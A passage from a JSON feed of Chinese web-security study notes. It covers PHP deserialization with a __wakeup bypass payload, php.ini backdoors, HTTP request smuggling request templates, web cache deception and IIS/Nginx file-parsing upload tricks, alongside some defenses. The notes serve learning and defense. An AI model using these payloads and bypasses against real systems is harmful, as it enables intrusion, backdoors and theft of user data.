格式化字符串</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vcHl0aG9uLXN0cmluZy1mb3JtYXQtdnVsbmVyYWJpbGl0eS5odG1s\">Python 字符串格式化漏洞</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2x1Y3Vtci5wb2Nvby5vcmcvMjAxNi8xMi8yOS9jYXJlZnVsLXdpdGgtc3RyLWZvcm1hdC8=\">Be Careful with Python's New-Style String Format</span></li>\n</ul>\n<h2 id=\"综合\"><a class=\"anchor\" href=\"#综合\">#</a> 综合</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3ZzdGlubmVyL3B5dGhvbi1zZWN1cml0eS5naXQ=\">python security</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JpdDR3b28vcHl0aG9uX3NlYw==\">Python 安全和代码审计相关资料收集</span></li>\n</ul>\n",
            "tags": [
                "语言",
                "反序列化",
                "混淆",
                "沙箱",
                "Python"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/PHP/",
            "url": "https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/PHP/",
            "title": "PHP",
            "date_published": "2022-11-27T07:53:16.000Z",
            "content_html": "<h1 id=\"后门\"><a class=\"anchor\" href=\"#后门\">#</a> 后门</h1>\n<h2 id=\"phpini构成的后门\"><a class=\"anchor\" href=\"#phpini构成的后门\">#</a> php.ini 构成的后门</h2>\n<p>利用 auto_prepend_file 和 include_path</p>\n<h2 id=\"userini文件构成的php后门\"><a class=\"anchor\" href=\"#userini文件构成的php后门\">#</a> .user.ini 文件构成的 PHP 后门</h2>\n<p>.user.ini 可运行于所有以 fastcgi 运行的 server。 利用方式同 php.ini</p>\n<h1 id=\"反序列化\"><a class=\"anchor\" href=\"#反序列化\">#</a> 反序列化</h1>\n<h2 id=\"php序列化实现\"><a class=\"anchor\" href=\"#php序列化实现\">#</a> PHP 序列化实现</h2>\n<h3 id=\"常见处理器\"><a class=\"anchor\" href=\"#常见处理器\">#</a> 常见处理器</h3>\n<p>PHP 序列化处理共有几种，分别为 php、php_serialize、php_binary 和 WDDX (需要编译时开启支持)，默认为 php，可通过配置中的  <code>session.serialize_handler</code>  修改。</p>\n<p>如果 PHP 编译时加入了 WDDX 支持，则只能用 WDDX，WDDX 从 PHP 7.4 版本后开始弃用。从 PHP 5.5.4 起可以使用 php_serialize。 php_serialize 在内部简单地直接使用 serialize/unserialize 函数，并且不会有 php 和 php_binary 所具有的限制。</p>\n<p>其中 PHP 处理器的格式为：键名 + 竖线 + 经过 serialize () 函数序列化处理的值。</p>\n<p>其中 php_binary 处理器的格式为：键名的长度对应的 ASCII 字符 + 键名 + 经过 serialize () 函数序列化处理的值。</p>\n<p>其中 php_serialize 处理器的格式为：经过 serialize () 函数序列化处理的数组。</p>\n<h3 id=\"序列化格式\"><a class=\"anchor\" href=\"#序列化格式\">#</a> 序列化格式</h3>\n<p>其中 php_serialize 的实现在  <code>php-src/ext/standard/var.c</code>  中，主要函数为  <code>php_var_serialize_intern</code>  ，序列化后的格式如下：</p>\n<ul>\n<li>boolean\n<ul>\n<li><code>b:&lt;value&gt;;</code></li>\n<li><code>b:1;</code>  // true</li>\n<li><code>b:0;</code>  // false</li>\n</ul>\n</li>\n<li>integer\n<ul>\n<li><code>i:&lt;value&gt;;</code></li>\n</ul>\n</li>\n<li>double\n<ul>\n<li><code>d:&lt;value&gt;;</code></li>\n</ul>\n</li>\n<li>NULL\n<ul>\n<li><code>N;</code></li>\n</ul>\n</li>\n<li>string\n<ul>\n<li><code>s:&lt;length&gt;:&quot;&lt;value&gt;&quot;;</code></li>\n<li><code>s:1:&quot;s&quot;;</code></li>\n</ul>\n</li>\n<li>array\n<ul>\n<li><code>a:&lt;length&gt;:&#123;key, value&#125;;</code></li>\n<li><code>a:1:&#123;s:4:&quot;key1&quot;;s:6:&quot;value1&quot;;&#125;</code>  //  <code>array(&quot;key1&quot; =&gt; &quot;value1&quot;);</code></li>\n</ul>\n</li>\n<li>object\n<ul>\n<li><code>O:&lt;class_name_length&gt;:&quot;&lt;class_name&gt;&quot;:&lt;number_of_properties&gt;:&#123;&lt;properties&gt;&#125;;</code></li>\n</ul>\n</li>\n<li>reference\n<ul>\n<li>指针类型</li>\n<li><code>R:reference;</code></li>\n<li>``O:1:&quot;A&quot;:2:{s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;R:2;}`</li>\n<li><code>$a = new A();$a-&gt;a=1;$a-&gt;b=&amp;$a-&gt;a;</code></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"private与protect\"><a class=\"anchor\" href=\"#private与protect\">#</a> private 与 protect</h3>\n<p>private 与 protect 变量和 public 变量不同，不能直接设置。</p>\n<p>private 属性只能在其被定义的类内部访问，且不会被继承，在属性前加上类名，即  <code>%00className%00</code>  用于标定其是私有的。</p>\n<p>protected 属性可以在父类和子类中访问，变量前添加  <code>%00*%00</code>  用于标定其是受保护的。</p>\n<h2 id=\"php反序列化漏洞\"><a class=\"anchor\" href=\"#php反序列化漏洞\">#</a> PHP 反序列化漏洞</h2>\n<p>php 在反序列化的时候会调用  <code>__wakeup</code>  /  <code>__sleep</code>  等函数，可能会造成代码执行等问题。若没有相关函数，在析构时也会调用相关的析构函数，同样会造成代码执行。</p>\n<p>另外  <code>__toString</code>  /  <code>__call</code>  两个函数也有利用的可能。</p>\n<p>其中  <code>__wakeup</code>  在反序列化时被触发， <code>__destruct</code>  在 GC 时被触发，  <code>__toString</code>  在 echo 时被触发， <code>__call</code>  在一个未被定义的函数调用时被触发。</p>\n<p>下面提供一个简单的 demo.</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Demo</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">data</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"construct&lt;br />\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"wake up&lt;br />\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Data's value is <span class=\"token interpolation\"><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">data</span></span>. &lt;br />\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"destruct&lt;br />\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Demo</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"raw value\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>输出</p>\n<pre><code>construct\nData's value is raw value.\ndestruct\nstring(44) &quot;O:4:&quot;Demo&quot;:1:&#123;s:4:&quot;data&quot;;s:9:&quot;raw value&quot;;&#125;&quot;\n</code></pre>\n<p>把序列化的字符串修改一下后，执行</p>\n<pre><code>unserialize('O:4:&quot;Demo&quot;:1:&#123;s:4:&quot;data&quot;;s:15:&quot;malicious value&quot;;&#125;');\n</code></pre>\n<p>输出</p>\n<pre><code>wake up\nData's value is malicious value.\ndestruct\n</code></pre>\n<p>这里看到，值被修改了.</p>\n<p>上面是一个  <code>unserialize()</code>  的简单应用，不难看出，如果  <code>__wakeup()</code>  或者  <code>__desturct()</code>  有敏感操作，比如读写文件、操作数据库，就可以通过函数实现文件读写或者数据读取的行为。</p>\n<p>那么，在  <code>__wakeup()</code>  中加入判断是否可以阻止这个漏洞呢？ 在  <code>__wakeup()</code>  中我们加入一行代码</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">data</span> <span class=\"token operator\">!=</span> <span class=\"token string single-quoted-string\">'raw value'</span><span class=\"token punctuation\">)</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">data</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'raw value'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"wake up&lt;br />\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>但其实还是可以绕过的，在 PHP5 &lt; 5.6.25， PHP7 &lt; 7.0.10 的版本都存在 wakeup 的漏洞。当反序列化中 object 的个数和之前的个数不等时，wakeup 就会被绕过，于是使用下面的 payload</p>\n<pre><code>unserialize('O:7:&quot;HITCON&quot;:1:&#123;s:4:&quot;data&quot;;s:15:&quot;malicious value&quot;;&#125;');\n</code></pre>\n<p>输出</p>\n<pre><code>Data's value is malicious value.\ndestruct\n</code></pre>\n<p>这里 wakeup 被绕过，值依旧被修改了。</p>\n<h2 id=\"利用点\"><a class=\"anchor\" href=\"#利用点\">#</a> 利用点</h2>\n<h3 id=\"soapclient-原生利用\"><a class=\"anchor\" href=\"#soapclient-原生利用\">#</a> SoapClient 原生利用</h3>\n<p>php 中的 SoapClient 类可以创建 soap 数据报文，在非 wsdl 模式下，SoapClient 的实例反序列化的时候会对第二个参数指明的 url 进行 soap 请求，该特性可用于 SSRF。</p>\n<h3 id=\"ziparchive-原生利用\"><a class=\"anchor\" href=\"#ziparchive-原生利用\">#</a> ZipArchive 原生利用</h3>\n<p>php 原生类  <code>ZipArchive::open()</code>  中的 flag 参数如果设置为  <code>ZipArchive::OVERWRITE</code>  时，会删除指定文件，该特性在一定条件下可以用于删除文件。</p>\n<h3 id=\"session\"><a class=\"anchor\" href=\"#session\">#</a> Session</h3>\n<p>PHP 中 session 默认是以文件形式存储的，文件以 sess_sessionid 命名，在 session 一定程度可控的情况下，可通过 session 触发反序列化。</p>\n<h2 id=\"相关cve\"><a class=\"anchor\" href=\"#相关cve\">#</a> 相关 CVE</h2>\n<h3 id=\"cve-2016-7124\"><a class=\"anchor\" href=\"#cve-2016-7124\">#</a> CVE-2016-7124</h3>\n<p>在 PHP 5.6.25 之前版本和 7.0.10 之前的版本，当对象的属性 (变量) 数大于实际的个数时，  <code>__wakeup()</code>  不会被执行。</p>\n<h1 id=\"disable-functions\"><a class=\"anchor\" href=\"#disable-functions\">#</a> Disable Functions</h1>\n<h2 id=\"机制实现\"><a class=\"anchor\" href=\"#机制实现\">#</a> 机制实现</h2>\n<p>PHP 中 Disable Function 的实现是在 php-src/Zend/Zend-API.c 中。PHP 在启动时，读取配置文件中禁止的函数，逐一根据禁止的函数名调用  <code>zend_disable_function</code>  来实现禁止的效果。</p>\n<p>这个函数根据函数名在内置函数列表中找到对应的位置并修改掉，当前版本的代码如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ZEND_API <span class=\"token keyword\">int</span> <span class=\"token function\">zend_disable_function</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>function_name<span class=\"token punctuation\">,</span> <span class=\"token class-name\">size_t</span> function_name_length<span class=\"token punctuation\">)</span> <span class=\"token comment\">/*</span></pre></td></tr></table></figure>",
            "tags": [
                "语言",
                "反序列化",
                "PHP"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/HTTP%20request/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/HTTP%20request/",
            "title": "HTTP请求走私",
            "date_published": "2022-11-27T07:47:26.000Z",
            "content_html": "<h1 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h1>\n<p>HTTP 请求走私是一种干扰网站处理 HTTP 请求序列方式的技术，最早在 2005 年的一篇 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY2dpc2VjdXJpdHkuY29tL2xpYi9IVFRQLVJlcXVlc3QtU211Z2dsaW5nLnBkZg==\">文章</span> 中被提出。</p>\n<h1 id=\"成因\"><a class=\"anchor\" href=\"#成因\">#</a> 成因</h1>\n<p>请求走私大多发生于前端服务器和后端服务器对客户端传入的数据理解不一致的情况。这是因为 HTTP 规范提供了两种不同的方法来指定请求的结束位置，即  <code>Content-Length</code>  和  <code>Transfer-Encoding</code>  标头。</p>\n<h1 id=\"分类\"><a class=\"anchor\" href=\"#分类\">#</a> 分类</h1>\n<ul>\n<li>CLTE：前端服务器使用  <code>Content-Length</code>  头，后端服务器使用  <code>Transfer-Encoding</code>  头</li>\n<li>TECL：前端服务器使用  <code>Transfer-Encoding</code>  标头，后端服务器使用  <code>Content-Length</code>  标头。</li>\n<li>TETE：前端和后端服务器都支持  <code>Transfer-Encoding</code>  标头，但是可以通过以某种方式来诱导其中一个服务器不处理它。</li>\n</ul>\n<h1 id=\"攻击\"><a class=\"anchor\" href=\"#攻击\">#</a> 攻击</h1>\n<h2 id=\"cl不为0的get请求\"><a class=\"anchor\" href=\"#cl不为0的get请求\">#</a> CL 不为 0 的 GET 请求</h2>\n<p>当前端服务器允许 GET 请求携带请求体，而后端服务器不允许 GET 请求携带请求体，它会直接忽略掉 GET 请求中的  <code>Content-Length</code>  头，不进行处理。例如下面这个例子：</p>\n<pre><code>GET / HTTP/1.1\\r\\n\nHost: example.com\\r\\n\nContent-Length: 44\\r\\n\n\nGET /secret HTTP/1.1\\r\\n\nHost: example.com\\r\\n\n\\r\\n\n</code></pre>\n<p>前端服务器处理了  <code>Content-Length</code>  ，而后端服务器没有处理  <code>Content-Length</code>  ，基于 pipeline 机制认为这是两个独立的请求，就造成了漏洞的发生。</p>\n<h2 id=\"cl-cl\"><a class=\"anchor\" href=\"#cl-cl\">#</a> CL-CL</h2>\n<p>根据 RFC 7230，当服务器收到的请求中包含两个  <code>Content-Length</code>  ，而且两者的值不同时，需要返回 400 错误，但是有的服务器并没有严格实现这个规范。这种情况下，当前后端各取不同的  <code>Content-Length</code>  值时，就会出现漏洞。例如：</p>\n<pre><code>POST / HTTP/1.1\\r\\n\nHost: example.com\\r\\n\nContent-Length: 8\\r\\n\nContent-Length: 7\\r\\n\n\n12345\\r\\n\na\n</code></pre>\n<p>这个例子中 a 就会被带入下一个请求，变为  <code>aGET / HTTP/1.1\\r\\n</code>  。</p>\n<h2 id=\"cl-te\"><a class=\"anchor\" href=\"#cl-te\">#</a> CL-TE</h2>\n<p>CL-TE 指前端服务器处理  <code>Content-Length</code>  这一请求头，而后端服务器遵守 RFC2616 的规定，忽略掉  <code>Content-Length</code>  ，处理  <code>Transfer-Encoding</code>  。例如：</p>\n<pre><code>POST / HTTP/1.1\\r\\n\nHost: example.com\\r\\n\n...\nConnection: keep-alive\\r\\n\nContent-Length: 6\\r\\n\nTransfer-Encoding: chunked\\r\\n\n\\r\\n\n0\\r\\n\n\\r\\n\na\n</code></pre>\n<p>这个例子中 a 同样会被带入下一个请求，变为  <code>aGET / HTTP/1.1\\r\\n</code>  。</p>\n<h2 id=\"te-cl\"><a class=\"anchor\" href=\"#te-cl\">#</a> TE-CL</h2>\n<p>TE-CL 指前端服务器处理  <code>Transfer-Encoding</code>  请求头，而后端服务器处理  <code>Content-Length</code>  请求头。例如：</p>\n<pre><code>POST / HTTP/1.1\\r\\n\nHost: example.com\\r\\n\n...\nContent-Length: 4\\r\\n\nTransfer-Encoding: chunked\\r\\n\n\\r\\n\n12\\r\\n\naPOST / HTTP/1.1\\r\\n\n\\r\\n\n0\\r\\n\n\\r\\n\n</code></pre>\n<h2 id=\"te-te\"><a class=\"anchor\" href=\"#te-te\">#</a> TE-TE</h2>\n<p>TE-TE 指前后端服务器都处理  <code>Transfer-Encoding</code>  请求头，但是在容错性上表现不同，例如有的服务器可能会处理  <code>Transfer-encoding</code>  ，测试例如：</p>\n<pre><code>POST / HTTP/1.1\\r\\n\nHost: example.com\\r\\n\n...\nContent-length: 4\\r\\n\nTransfer-Encoding: chunked\\r\\n\nTransfer-encoding: cow\\r\\n\n\\r\\n\n5c\\r\\n\naPOST / HTTP/1.1\\r\\n\nContent-Type: application/x-www-form-urlencoded\\r\\n\nContent-Length: 15\\r\\n\n\\r\\n\nx=1\\r\\n\n0\\r\\n\n\\r\\n\n</code></pre>\n<h1 id=\"防御\"><a class=\"anchor\" href=\"#防御\">#</a> 防御</h1>\n<ul>\n<li>禁用后端连接重用</li>\n<li>确保连接中的所有服务器具有相同的配置</li>\n<li>拒绝有二义性的请求</li>\n</ul>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<h2 id=\"rfc\"><a class=\"anchor\" href=\"#rfc\">#</a> RFC</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzI2MTY=\">RFC 2616 Hypertext Transfer Protocol -- HTTP/1.1</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzcyMzA=\">RFC 7230 Hypertext Transfer Protocol (HTTP/1.1): Message Syntax and Routing -- HTTP/1.1</span></li>\n</ul>\n<h2 id=\"blog-whitepaper\"><a class=\"anchor\" href=\"#blog-whitepaper\">#</a> Blog / Whitepaper</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY2dpc2VjdXJpdHkuY29tL2xpYi9IVFRQLVJlcXVlc3QtU211Z2dsaW5nLnBkZg==\">HTTP Request Smuggling by chaiml</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3JlcXVlc3Qtc211Z2dsaW5n\">HTTP request smuggling by portswigger</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjY1NA==\">从一道题到协议层攻击之 HTTP 请求走私</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2kuYmxhY2toYXQuY29tL1VTQS0yMC9XZWRuZXNkYXkvdXMtMjAtS2xlaW4tSFRUUC1SZXF1ZXN0LVNtdWdnbGluZy1Jbi0yMDIwLU5ldy1WYXJpYW50cy1OZXctRGVmZW5zZXMtQW5kLU5ldy1DaGFsbGVuZ2VzLnBkZg==\">HTTP Request Smuggling in 2020</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sYWJzLmJpc2hvcGZveC5jb20vdGVjaC1ibG9nL2gyYy1zbXVnZ2xpbmctcmVxdWVzdC1zbXVnZ2xpbmctdmlhLWh0dHAvMi1jbGVhcnRleHQtaDJj\">h2c Smuggling: Request Smuggling Via HTTP/2 Cleartext (h2c)</span></li>\n</ul>\n",
            "tags": [
                "网络安全",
                "HTTP",
                "服务器"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/Web%20Cache/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/Web%20Cache/",
            "title": "Web Cache欺骗攻击",
            "date_published": "2022-11-27T07:42:19.000Z",
            "content_html": "<h1 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h1>\n<p>网站通常都会通过如 CDN、负载均衡器、或者反向代理来实现 Web 缓存功能。通过缓存频繁访问的文件，降低服务器响应延迟。</p>\n<p>例如，网站  <code>htttp://www.example.com</code>  配置了反向代理。对于那些包含用户个人信息的页面，如  <code>http://www.example.com/home.php</code>  ，由于每个用户返回的内容有所不同，因此这类页面通常是动态生成，并不会在缓存服务器中进行缓存。通常缓存的主要是可公开访问的静态文件，如 css 文件、js 文件、txt 文件、图片等等。此外，很多最佳实践类的文章也建议，对于那些能公开访问的静态文件进行缓存，并且忽略 HTTP 缓存头。</p>\n<p>Web cache 攻击类似于 RPO 相对路径重写攻击，都依赖于浏览器与服务器对 URL 的解析方式。当访问不存在的 URL 时，如  <code>http://www.example.com/home.php/non-existent.css</code>  ，浏览器发送 get 请求，依赖于使用的技术与配置，服务器返回了页面  <code>http://www.example.com/home.php</code>  的内容，同时 URL 地址仍然是  <code>http://www.example.com/home.php/non-existent.css</code> ，http 头的内容也与直接访问  <code>http://www.example.com/home.php</code>  相同，cacheing header、content-type（此处为 text/html）也相同。</p>\n<h1 id=\"漏洞成因\"><a class=\"anchor\" href=\"#漏洞成因\">#</a> 漏洞成因</h1>\n<p>当代理服务器设置为缓存静态文件并忽略这类文件的 caching header 时，访问  <code>http://www.example.com/home.php/no-existent.css</code>  时，会发生什么呢？整个响应流程如下：</p>\n<ol>\n<li>浏览器请求  <code>http://www.example.com/home.php/no-existent.css</code>  ;</li>\n<li>服务器返回  <code>http://www.example.com/home.php</code>  的内容 (通常来说不会缓存该页面);</li>\n<li>响应经过代理服务器；</li>\n<li>代理识别该文件有 css 后缀；</li>\n<li>在缓存目录下，代理服务器创建目录  <code>home.php</code>  ，将返回的内容作为  <code>non-existent.css</code>  保存。</li>\n</ol>\n<h1 id=\"漏洞利用\"><a class=\"anchor\" href=\"#漏洞利用\">#</a> 漏洞利用</h1>\n<p>攻击者欺骗用户访问  <code>http://www.example.com/home.php/logo.png?www.myhack58.com</code>  , 导致含有用户个人信息的页面被缓存，从而能被公开访问到。更严重的情况下，如果返回的内容包含 session 标识、安全问题的答案，或者 csrf token。这样攻击者能接着获得这些信息，因为通常而言大部分网站静态资源都是公开可访问的。</p>\n<h1 id=\"漏洞存在的条件\"><a class=\"anchor\" href=\"#漏洞存在的条件\">#</a> 漏洞存在的条件</h1>\n<p>漏洞要存在，至少需要满足下面两个条件：</p>\n<ol>\n<li>web cache 功能根据扩展进行保存，并忽略 caching header;</li>\n<li>当访问如  <code>http://www.example.com/home.php/non-existent.css</code>  不存在的页面，会返回  <code>home.php</code>  的内容。</li>\n</ol>\n<h1 id=\"漏洞防御\"><a class=\"anchor\" href=\"#漏洞防御\">#</a> 漏洞防御</h1>\n<p>防御措施主要包括 3 点：</p>\n<ol>\n<li>设置缓存机制，仅仅缓存 http caching header 允许的文件，这能从根本上杜绝该问题；</li>\n<li>如果缓存组件提供选项，设置为根据 content-type 进行缓存；</li>\n<li>访问  <code>http://www.example.com/home.php/non-existent.css</code>  这类不存在页面，不返回  <code>home.php</code>  的内容，而返回 404 或者 302。</li>\n</ol>\n<h1 id=\"web-cache欺骗攻击实例\"><a class=\"anchor\" href=\"#web-cache欺骗攻击实例\">#</a> Web Cache 欺骗攻击实例</h1>\n<h2 id=\"paypal\"><a class=\"anchor\" href=\"#paypal\">#</a> Paypal</h2>\n<p>Paypal 在未修复之前，通过该攻击，可以获取的信息包括：用户姓名、账户金额、信用卡的最后 4 位数、交易数据、emaill 地址等信息。 受该攻击的部分页面包括：</p>\n<ul>\n<li><code>https://www.paypal.com/myaccount/home/attack.css</code></li>\n<li><code>https://www.paypal.com/myaccount/settings/notifications/attack.css</code></li>\n<li><code>https://history.paypal.com/cgi-bin/webscr/attack.css?cmd=_history-details</code>  。</li>\n</ul>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvYmxvZy9wcmFjdGljYWwtd2ViLWNhY2hlLXBvaXNvbmluZw==\">practical web cache poisoning</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9jb25mZXJlbmNlL3VzZW5peHNlY3VyaXR5MTgvcHJlc2VudGF0aW9uL2hhbw==\">End-Users Get Maneuvered: Empirical Analysis of Redirection Hijacking in Content Delivery Networks</span></li>\n</ul>\n",
            "tags": [
                "网络安全",
                "漏洞",
                "Cache"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E4%B8%AD%E9%97%B4%E4%BB%B6/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E4%B8%AD%E9%97%B4%E4%BB%B6/",
            "title": "中间件",
            "date_published": "2022-11-27T02:59:09.000Z",
            "content_html": "<h1 id=\"iis\"><a class=\"anchor\" href=\"#iis\">#</a> IIS</h1>\n<h2 id=\"iis-60\"><a class=\"anchor\" href=\"#iis-60\">#</a> IIS 6.0</h2>\n<ul>\n<li>\n<p>后缀解析  <code>/xx.asp;.jpg</code></p>\n<ul>\n<li>服务器默认不解析  <code>;</code>  号及其后面的内容，相当于截断。</li>\n</ul>\n</li>\n<li>\n<p>目录解析  <code>/xx.asp/xx.jpg</code>  (xx.asp 目录下任意解析)</p>\n</li>\n<li>\n<p>默认解析  <code>xx.asa</code>   <code>xx.cer</code>   <code>xx.cdx</code></p>\n</li>\n<li>\n<p>PROPFIND 栈溢出漏洞</p>\n</li>\n<li>\n<p>RCE CVE-2017-7269</p>\n</li>\n</ul>\n<h2 id=\"iis-70-75-nginx-0837\"><a class=\"anchor\" href=\"#iis-70-75-nginx-0837\">#</a> IIS 7.0-7.5 / Nginx &lt;= 0.8.37</h2>\n<p>在 Fast-CGI 开启状态下，在文件路径后加上  <code>/xx.php</code>  ，即  <code>xx.jpg/xx.php</code>  会被解析为 php 文件。</p>\n<h2 id=\"put漏洞\"><a class=\"anchor\" href=\"#put漏洞\">#</a> PUT 漏洞</h2>\n<ul>\n<li>开启 WebDAV</li>\n<li>拥有来宾用户，且来宾用户拥有上传权限</li>\n<li>可任意文件上传</li>\n</ul>\n<h2 id=\"windows特性\"><a class=\"anchor\" href=\"#windows特性\">#</a> Windows 特性</h2>\n<p>Windows 不允许空格和点以及一些特殊字符作为结尾，创建这样的文件会自动重命名，所以可以使用  <code>xx.php[空格]</code>  ，  <code>xx.php.</code> ，  <code>xx.php/</code> ，  <code>xx.php::$DATA</code>  上传脚本文件。</p>\n<h2 id=\"文件名猜解\"><a class=\"anchor\" href=\"#文件名猜解\">#</a> 文件名猜解</h2>\n<p>在支持 NTFS 8.3 文件格式时，可利用短文件名猜解目录文件。其中短文件名特征如下：</p>\n<ul>\n<li>文件名为原文件名前 6 位字符加上  <code>~1</code>  ，其中数字部分是递增的，如果存在前缀相同的文件，则后面的数字进行递增。</li>\n<li>后缀名不超过 3 位，超过部分会被截断</li>\n<li>所有小写字母均转换成大写的字母</li>\n<li>文件名后缀长度大于等于 4 或者总长度大于等于 9 